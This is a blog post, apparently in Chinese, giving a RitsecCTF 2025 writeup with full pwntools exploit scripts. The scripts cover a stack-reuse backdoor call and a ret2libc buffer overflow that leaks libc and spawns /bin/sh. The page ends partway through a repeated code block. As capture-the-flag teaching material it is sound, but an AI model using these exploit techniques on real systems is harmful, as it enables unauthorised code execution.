<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>RitsecCTF 2025 Writeup | 花盆</title><meta name="author" content="LittFlower"/><meta property="og:title" content="RitsecCTF 2025 Writeup | 花盆"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/RitsecCTF2025-Writeup/"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="stylesheet" href="/fonts.css" type="text/css" preload/><link rel="stylesheet" href="/style.css" type="text/css" preload/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"><div class="file"><a href="./README.mdx" class="file-link"><img src="/icons/text.png" alt/><span>README.mdx</span></a><div class="file-meta"><span>8.83 KiB</span><span class="file-meta-date">2025-04-08 10:28</span></div></div></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="ritsecctf-2025-writeup" class="scroll-target"><a href="#ritsecctf-2025-writeup"><code class="hash inline-code">#</code>RitsecCTF 2025 Writeup</a></h1>
<p>跟 n1 junior 的师傅们一起打了这场比赛，4 道出了 3 道，简单记录一下。</p>
<h2 id="bit_burger" class="scroll-target"><a href="#bit_burger"><code class="hash inline-code">#</code>bit_burger</a></h2>
<p>思路比较简单，利用了函数调用/返回后不会清理栈空间的特性，先通过第一个位操作在栈上构造一个 backdoor 地址出来，第二步直接调用就可以了。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">bit_burger.bin_patched</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">binex-bitburger.ctf.ritsec.club</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 32200</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">b *0x401598</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">ogg </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">401355</span><br><span style="color:#393A34">s </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">0</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#998418"> bin</span><span style="color:#2993a3">(</span><span style="color:#393A34">ogg</span><span style="color:#2993a3">)</span><span style="color:#2993a3">[</span><span style="color:#2F798A">2</span><span style="color:#999999">:</span><span style="color:#2993a3">]</span><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#998418">len</span><span style="color:#1e754f">(</span><span style="color:#393A34">s</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> s</span><span style="color:#2993a3">[</span><span style="color:#998418">len</span><span style="color:#1e754f">(</span><span style="color:#393A34">s</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> -</span><span style="color:#393A34"> i </span><span style="color:#AB5959">-</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> "</span><span style="color:#B56959">1</span><span style="color:#B5695977">"</span><span style="color:#999999">:</span><br><span style="color:#393A34">        io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">(y/n)? </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">y</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    elif</span><span style="color:#393A34"> s</span><span style="color:#2993a3">[</span><span style="color:#998418">len</span><span style="color:#1e754f">(</span><span style="color:#393A34">s</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> -</span><span style="color:#393A34"> i </span><span style="color:#AB5959">-</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> "</span><span style="color:#B56959">0</span><span style="color:#B5695977">"</span><span style="color:#999999">:</span><br><span style="color:#393A34">        io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">(y/n)? </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">n</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># io.sendlineafter(b"(y/n)? ", b"n")</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Would you like that grilled or fried?: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> p64</span><span style="color:#1e754f">(</span><span style="color:#2F798A">114514</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#758575DD">#!/usr/bin/env python3</span><br><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">bit_burger.bin_patched</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">binex-bitburger.ctf.ritsec.club</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 32200</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">b *0x401598</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">ogg </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">401355</span><br><span style="color:#DBD7CAEE">s </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">0</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#B8A965"> bin</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">ogg</span><span style="color:#5eaab5">)</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">2</span><span style="color:#666666">:</span><span style="color:#5eaab5">]</span><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">s</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> s</span><span style="color:#5eaab5">[</span><span style="color:#B8A965">len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">s</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE"> i </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">(y/n)? </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">y</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    elif</span><span style="color:#DBD7CAEE"> s</span><span style="color:#5eaab5">[</span><span style="color:#B8A965">len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">s</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE"> i </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">0</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">(y/n)? </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">n</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># io.sendlineafter(b"(y/n)? ", b"n")</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Would you like that grilled or fried?: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">114514</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="hashmatch" class="scroll-target"><a href="#hashmatch"><code class="hash inline-code">#</code>hashmatch</a></h2>
<p>比较怪的题，当 ret2libc 打的。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./hashmatch_patched</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">""</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">b *0x4013c7</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00000000004011f6</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">is:</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">md5 </span><span style="color:#999999">=</span><span style="color:#393A34"> io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#393A34"> cyclic</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1016</span><span style="color:#999999">,</span><span style="color:#B07D48"> n</span><span style="color:#999999">=</span><span style="color:#2F798A">8</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">got</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">puts</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">]</span><span style="color:#999999">,</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">plt</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">puts</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">]</span><span style="color:#999999">,</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">game</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">:(</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc_base </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">Y</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">77820</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"libc_base => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_base</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">binsh </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#998418"> next</span><span style="color:#2993a3">(</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">search</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"binsh => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">binsh</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">system </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">04013C7</span><br><br><span style="color:#393A34">payload2 </span><span style="color:#999999">=</span><span style="color:#393A34"> cyclic</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1008</span><span style="color:#999999">,</span><span style="color:#B07D48"> n</span><span style="color:#999999">=</span><span style="color:#2F798A">8</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">binsh</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload2 </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> binsh</span><span style="color:#999999">,</span><span style="color:#393A34"> system</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#758575DD">#!/usr/bin/env python3</span><br><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./hashmatch_patched</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">""</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> 